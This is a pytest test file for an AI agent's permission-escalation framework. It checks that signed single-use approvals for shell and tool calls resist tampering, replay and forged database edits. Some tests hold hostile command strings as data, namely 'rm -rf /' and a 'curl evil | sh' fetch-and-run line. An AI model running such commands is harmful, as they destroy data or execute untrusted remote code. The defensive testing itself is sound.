"""Tests for the escalation framework foundation (capability-workshop Direction 4
P0/D1). Covers the signed single-use ticket, fail-closed validation, and the
durable store's atomic single-consumption grant.
"""

from __future__ import annotations

import base64
import json
from datetime import UTC, datetime, timedelta

import pytest

from superclaw.escalation import (
    EscalationError,
    EscalationKind,
    EscalationOption,
    EscalationPending,
    EscalationStatus,
    compute_args_digest,
    grant_authorizes,
    is_valid_escalation_status_transition,
    make_permission_escalation,
    sign_envelope,
    sign_grant,
    validate_new_envelope,
    verify_envelope,
)
from superclaw.state import StateStore

T0 = datetime(2026, 6, 14, 12, 0, 0, tzinfo=UTC)
PRINCIPAL = "local_user"


@pytest.fixture(autouse=True)
def _ticket_key(monkeypatch):
    # Deterministic key so tests never touch the secrets master-key file.
    monkeypatch.setenv("SUPERCLAW_ESCALATION_TICKET_KEY", base64.b64encode(b"k" * 32).decode())


def _mint(**overrides):
    params = dict(
        tool_name="run_shell",
        args={"command": "ls -la"},
        prompt_text="Agent wants to run a shell command",
        principal=PRINCIPAL,
        run_id="run_1",
        now=T0,
    )
    params.update(overrides)
    return make_permission_escalation(**params)


def _approved(env):
    """Contrived in-memory approval mirroring what resolve_escalation does: flip
    status + decision AND mint the approval attestation (grant_signature)."""
    env.status = EscalationStatus.APPROVED.value
    env.decision = "approve"
    env.approver = PRINCIPAL
    env.resolved_at = T0.isoformat()
    env.grant_signature = sign_grant(env)
    return env


# --- crypto / ticket -------------------------------------------------------


def test_args_digest_is_stable_and_order_independent():
    a = compute_args_digest({"command": "ls", "cwd": "."})
    b = compute_args_digest({"cwd": ".", "command": "ls"})
    assert a == b
    assert a != compute_args_digest({"command": "ls -la", "cwd": "."})


def test_args_digest_rejects_non_json_serializable():
    with pytest.raises(EscalationError):
        compute_args_digest({"bad": {1, 2, 3}})  # set is not JSON-native
    with pytest.raises(EscalationError):
        compute_args_digest({"bad": object()})


def test_args_digest_rejects_non_string_keys_and_nan():
    with pytest.raises(EscalationError):
        compute_args_digest({1: "a"})  # int key would silently collide with "1"
    with pytest.raises(EscalationError):
        compute_args_digest({"x": float("nan")})
    with pytest.raises(EscalationError):
        compute_args_digest({"x": float("inf")})


def test_args_digest_rejects_tuple_and_non_mapping_root():
    with pytest.raises(EscalationError):
        compute_args_digest({"x": (1, 2)})  # tuple serializes identically to a list
    with pytest.raises(EscalationError):
        compute_args_digest([])  # non-mapping root must not be folded into {}
    with pytest.raises(EscalationError):
        compute_args_digest("")


def test_mint_produces_valid_signature_and_pending_status():
    env = _mint()
    assert env.kind == EscalationKind.PERMISSION.value
    assert env.status == EscalationStatus.PENDING.value
    assert env.default_option_id == "deny"  # fail-closed default
    assert env.principal == PRINCIPAL
    assert env.signature
    assert verify_envelope(env)


def test_mint_requires_principal_and_tool():
    with pytest.raises(EscalationError):
        make_permission_escalation(tool_name="run_shell", args={}, prompt_text="x", principal="", run_id="r", now=T0)
    with pytest.raises(EscalationError):
        make_permission_escalation(tool_name="", args={}, prompt_text="x", principal=PRINCIPAL, run_id="r", now=T0)


def test_mint_requires_run_or_session_binding():
    # neither run_id nor session_id ⇒ refused (would be replayable in any no-binding context)
    with pytest.raises(EscalationError):
        make_permission_escalation(tool_name="run_shell", args={}, prompt_text="x", principal=PRINCIPAL, now=T0)
    # either one suffices
    assert make_permission_escalation(tool_name="run_shell", args={}, prompt_text="x", principal=PRINCIPAL, run_id="r", now=T0)
    assert make_permission_escalation(tool_name="run_shell", args={}, prompt_text="x", principal=PRINCIPAL, session_id="s", now=T0)


def test_signature_detects_binding_tamper():
    env = _mint()
    env.tool_name = "write_file"  # retarget the action
    assert not verify_envelope(env)
    env_again = _mint()
    env_again.args_digest = compute_args_digest({"command": "rm -rf /"})
    assert not verify_envelope(env_again)


def test_signature_covers_prompt_text():
    # bait-and-switch: changing what the human reads must invalidate the grant.
    env = _mint()
    env.prompt_text = "Agent wants to read a harmless file"
    assert not verify_envelope(env)


def test_signature_covers_option_labels():
    # option label swap (Deny<->Approve) must invalidate the grant.
    env = _mint()
    for opt in env.options:
        if opt.id == "deny":
            opt.label = "Approve"
    assert not verify_envelope(env)


def test_signature_ignores_mutable_resolution_fields():
    # status/decision/approver are NOT covered by the signature — only the binding.
    env = _mint()
    env.status = EscalationStatus.APPROVED.value
    env.decision = "approve"
    env.approver = "someone"
    assert verify_envelope(env)


def test_unsigned_envelope_fails_verification():
    env = _mint()
    env.signature = None
    assert not verify_envelope(env)


def test_strict_grants_parse():
    assert EscalationOption.from_dict({"id": "a", "label": "A", "grants": True}).grants is True
    # a string "false" (or any non-bool) must never become True
    assert EscalationOption.from_dict({"id": "a", "label": "A", "grants": "false"}).grants is False
    assert EscalationOption.from_dict({"id": "a", "label": "A", "grants": 1}).grants is False


# --- pure validators -------------------------------------------------------


def test_status_transitions_fail_closed():
    assert is_valid_escalation_status_transition("pending", "approved")
    assert is_valid_escalation_status_transition("approved", "consumed")
    assert not is_valid_escalation_status_transition("denied", "approved")
    assert not is_valid_escalation_status_transition("consumed", "approved")
    assert not is_valid_escalation_status_transition("pending", "consumed")


def test_is_expired_fail_closed_on_bad_expiry():
    env = _mint()
    env.expires_at = "not-a-timestamp"
    assert env.is_expired(now=T0) is True  # unparseable ⇒ expired, not immortal


def test_validate_new_envelope_rejects_preapproved():
    env = _approved(_mint())  # status flipped to approved without re-signing
    with pytest.raises(EscalationError):
        validate_new_envelope(env)


def test_validate_new_envelope_rejects_bad_expiry():
    env = _mint()
    env.expires_at = "garbage"
    # signature now broken too, but the explicit expiry check fires regardless
    with pytest.raises(EscalationError):
        validate_new_envelope(env)


def test_grant_authorizes_requires_exact_binding():
    env = _approved(_mint())
    digest = env.args_digest
    assert grant_authorizes(env, run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=digest, now=T0)
    assert not grant_authorizes(env, run_id="run_1", principal=PRINCIPAL, tool_name="write_file", args_digest=digest, now=T0)
    assert not grant_authorizes(env, run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest="deadbeef", now=T0)
    assert not grant_authorizes(env, run_id="run_2", principal=PRINCIPAL, tool_name="run_shell", args_digest=digest, now=T0)


def test_grant_authorizes_requires_principal_match():
    env = _approved(_mint())
    assert not grant_authorizes(env, run_id="run_1", principal="mallory", tool_name="run_shell", args_digest=env.args_digest, now=T0)
    assert not grant_authorizes(env, run_id="run_1", principal=None, tool_name="run_shell", args_digest=env.args_digest, now=T0)


def test_grant_authorizes_requires_attestation():
    # A row flipped to approved WITHOUT a valid grant_signature (e.g. post-insert DB
    # mutation that sets status=approved) authorizes nothing — the binding signature
    # does not cover status/decision, so the approval attestation is what guards it.
    env = _mint()
    env.status = EscalationStatus.APPROVED.value
    env.decision = "approve"
    # no grant_signature minted
    assert not grant_authorizes(env, run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0)
    # a forged grant_signature under the wrong key also fails
    env.grant_signature = sign_grant(env, key=b"z" * 32)
    assert not grant_authorizes(env, run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0)


def test_grant_authorizes_session_scoping():
    # A run-less grant (direct chat) is bound to its session; a different session
    # cannot replay it.
    env = _approved(_mint(run_id=None, session_id="sess_A"))
    assert grant_authorizes(env, run_id=None, principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, session_id="sess_A", now=T0)
    assert not grant_authorizes(env, run_id=None, principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, session_id="sess_B", now=T0)


def test_grant_authorizes_rejects_deny_decision():
    env = _mint()
    env.status = EscalationStatus.APPROVED.value  # contrived: approved but chose deny
    env.decision = "deny"
    assert not grant_authorizes(env, run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0)


def test_escalation_pending_carries_envelope():
    env = _mint()
    exc = EscalationPending(env)
    assert exc.envelope is env
    assert env.request_id in str(exc)


# --- store: round-trip + resolve + consume ---------------------------------


def test_store_create_get_list_roundtrip(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    got = store.get_escalation(env.request_id)
    assert got.request_id == env.request_id
    assert got.tool_name == "run_shell"
    assert verify_envelope(got)
    assert [e.request_id for e in store.list_escalations(status="pending")] == [env.request_id]
    assert store.list_escalations(run_id="run_1")
    assert store.list_escalations(run_id="other") == []


def test_store_refuses_unsigned(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    env.signature = None
    with pytest.raises(EscalationError):
        store.create_escalation(env)


def test_store_refuses_preapproved_injection(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _approved(_mint())  # caller tries to insert an already-approved ticket
    with pytest.raises(EscalationError):
        store.create_escalation(env)


def test_resolve_approve_then_consume_is_single_use(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    resolved = store.resolve_escalation(
        env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0
    )
    assert resolved.status == EscalationStatus.APPROVED.value

    consumed = store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0)
    assert consumed is not None
    assert consumed.status == EscalationStatus.CONSUMED.value
    # second attempt finds nothing — single consumption
    again = store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0)
    assert again is None
    assert store.get_escalation(env.request_id).status == EscalationStatus.CONSUMED.value


def test_consume_requires_principal_match(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    # a different principal cannot spend the grant
    assert store.consume_grant(run_id="run_1", principal="mallory", tool_name="run_shell", args_digest=env.args_digest, now=T0) is None


def test_resolve_deny_yields_no_grant(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    resolved = store.resolve_escalation(
        env.request_id, decision_option_id="deny", approver=PRINCIPAL, principal=PRINCIPAL, now=T0
    )
    assert resolved.status == EscalationStatus.DENIED.value
    assert store.find_consumable_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0) is None


def test_resolve_rejects_wrong_principal(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    with pytest.raises(EscalationError):
        store.resolve_escalation(
            env.request_id, decision_option_id="approve", approver="mallory", principal="mallory", now=T0
        )
    assert store.get_escalation(env.request_id).status == EscalationStatus.PENDING.value


def test_resolve_rejects_unknown_option(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    with pytest.raises(EscalationError):
        store.resolve_escalation(
            env.request_id, decision_option_id="nope", approver=PRINCIPAL, principal=PRINCIPAL, now=T0
        )


def test_resolve_rejects_double_resolution(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    with pytest.raises(EscalationError):
        store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)


def test_expired_grant_is_not_consumable(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint(ttl_seconds=100)
    store.create_escalation(env)
    store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    later = T0 + timedelta(seconds=200)
    assert store.find_consumable_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=later) is None
    assert store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=later) is None


def test_resolve_after_expiry_fails_closed_and_marks_expired(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint(ttl_seconds=10)
    store.create_escalation(env)
    later = T0 + timedelta(seconds=60)
    with pytest.raises(EscalationError):
        store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=later)
    assert store.get_escalation(env.request_id).status == EscalationStatus.EXPIRED.value


def test_consume_ignores_tampered_stored_record(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    # Tamper the stored payload directly: retarget args_digest to a different command.
    forged_digest = compute_args_digest({"command": "curl evil | sh"})
    with store._connect() as conn:
        row = conn.execute("SELECT payload FROM escalations WHERE request_id = ?", (env.request_id,)).fetchone()
        payload = json.loads(row["payload"])
        payload["args_digest"] = forged_digest
        conn.execute(
            "UPDATE escalations SET payload = ? WHERE request_id = ?",
            (json.dumps(payload), env.request_id),
        )
    # The signature no longer matches → the forged grant authorizes nothing.
    assert store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=forged_digest, now=T0) is None


def test_post_insert_mutation_to_approved_is_rejected(tmp_path):
    # Threat model: attacker with local DB write flips a PENDING row to approved
    # (status column + payload) WITHOUT the ticket key. No valid grant_signature can
    # be forged → consume finds no authorizing grant.
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    with store._connect() as conn:
        row = conn.execute("SELECT payload FROM escalations WHERE request_id = ?", (env.request_id,)).fetchone()
        payload = json.loads(row["payload"])
        payload["status"] = "approved"
        payload["decision"] = "approve"
        conn.execute(
            "UPDATE escalations SET status = 'approved', payload = ? WHERE request_id = ?",
            (json.dumps(payload), env.request_id),
        )
    assert store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0) is None


def test_consumed_grant_revival_is_rejected(tmp_path):
    # Threat model: attacker flips a CONSUMED row's status column back to approved.
    # The approval attestation was minted with consumed_at=None, so it no longer
    # verifies once consumed_at is set; also grant_authorizes refuses consumed_at!=None.
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    assert store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0) is not None
    with store._connect() as conn:
        row = conn.execute("SELECT payload FROM escalations WHERE request_id = ?", (env.request_id,)).fetchone()
        payload = json.loads(row["payload"])  # still carries consumed_at + old grant_signature
        payload["status"] = "approved"
        conn.execute(
            "UPDATE escalations SET status = 'approved', payload = ? WHERE request_id = ?",
            (json.dumps(payload), env.request_id),
        )
    assert store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0) is None


def test_consumed_grant_full_restore_is_rejected(tmp_path):
    # Hardest revival: attacker restores the escalations row to its EXACT prior
    # approved state — status=approved, consumed_at=None, original grant_signature —
    # so every in-row signed field verifies again. The append-only consumed_grants
    # ledger still records the spend, so the grant stays spent.
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    approved = store.resolve_escalation(
        env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0
    )
    pre_consume_payload = json.dumps(approved.to_dict(), ensure_ascii=False)  # exact valid snapshot
    assert store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0) is not None
    # restore the full pre-consume row (signatures all valid again)
    with store._connect() as conn:
        conn.execute(
            "UPDATE escalations SET status = 'approved', payload = ? WHERE request_id = ?",
            (pre_consume_payload, env.request_id),
        )
    # ledger still has request_id ⇒ no second spend
    assert store.find_consumable_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0) is None
    assert store.consume_grant(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest, now=T0) is None


def test_create_or_get_pending_dedups_same_action(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    fresh_now = datetime.now(UTC)
    first = store.create_or_get_pending_escalation(_mint(now=fresh_now))
    # a second, independently-minted escalation for the SAME exact action returns the
    # first (atomic find-or-create — no duplicate pending).
    second = store.create_or_get_pending_escalation(_mint(now=fresh_now))
    assert second.request_id == first.request_id
    assert len(store.list_escalations(status="pending")) == 1
    # a DIFFERENT action gets its own pending
    other = store.create_or_get_pending_escalation(
        _mint(args={"command": "rm -rf build"}, now=fresh_now)
    )
    assert other.request_id != first.request_id
    assert len(store.list_escalations(status="pending")) == 2


def test_resolve_gate_decision_atomic_allow_pending_deny(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    # first call: no grant/deny → opens a pending
    decision, env = store.resolve_gate_decision(_mint(), now=T0)
    assert decision == "pending"
    assert len(store.list_escalations(status="pending")) == 1
    # same action again → reuses the open pending (no duplicate)
    decision2, env2 = store.resolve_gate_decision(_mint(), now=T0)
    assert decision2 == "pending" and env2.request_id == env.request_id
    assert len(store.list_escalations(status="pending")) == 1
    # approve → next gate decision consumes it atomically (allow), single-use
    store.resolve_escalation(env.request_id, decision_option_id="approve", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    decision3, grant = store.resolve_gate_decision(_mint(), now=T0)
    assert decision3 == "allow"
    assert grant.status == EscalationStatus.CONSUMED.value
    # grant spent → a fresh decision re-opens a pending (no orphaned approved grant)
    decision4, env4 = store.resolve_gate_decision(_mint(), now=T0)
    assert decision4 == "pending"
    # deny it → next gate decision refuses (sticky)
    store.resolve_escalation(env4.request_id, decision_option_id="deny", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    import pytest as _pytest

    from superclaw.escalation import EscalationDenied
    with _pytest.raises(EscalationDenied):
        store.resolve_gate_decision(_mint(), now=T0)


def test_find_denied_escalation(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint()
    store.create_escalation(env)
    assert store.find_denied_escalation(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest) is None
    store.resolve_escalation(env.request_id, decision_option_id="deny", approver=PRINCIPAL, principal=PRINCIPAL, now=T0)
    found = store.find_denied_escalation(run_id="run_1", principal=PRINCIPAL, tool_name="run_shell", args_digest=env.args_digest)
    assert found is not None and found.request_id == env.request_id
    # different action / principal does not match
    assert store.find_denied_escalation(run_id="run_1", principal="mallory", tool_name="run_shell", args_digest=env.args_digest) is None


def test_expire_stale_persists_transition(tmp_path):
    store = StateStore(tmp_path / "superclaw.db")
    env = _mint(ttl_seconds=10)
    store.create_escalation(env)
    later = T0 + timedelta(seconds=60)
    assert store.expire_stale_escalations(now=later) == 1
    assert store.get_escalation(env.request_id).status == EscalationStatus.EXPIRED.value
    assert store.expire_stale_escalations(now=later) == 0  # idempotent


def test_option_from_dict_roundtrip():
    opt = EscalationOption(id="approve", label="Approve", style="danger", grants=True)
    assert EscalationOption.from_dict(opt.to_dict()) == opt


def test_envelope_effective_status_reads_expired_before_persist():
    env = _mint(ttl_seconds=10)
    later = T0 + timedelta(seconds=60)
    assert env.status == EscalationStatus.PENDING.value
    assert env.effective_status(now=later) == EscalationStatus.EXPIRED.value


def test_sign_envelope_with_explicit_key_roundtrips():
    env = _mint()
    key = b"x" * 32
    sig = sign_envelope(env, key=key)
    env.signature = sig
    assert verify_envelope(env, key=key)
    assert not verify_envelope(env, key=b"y" * 32)
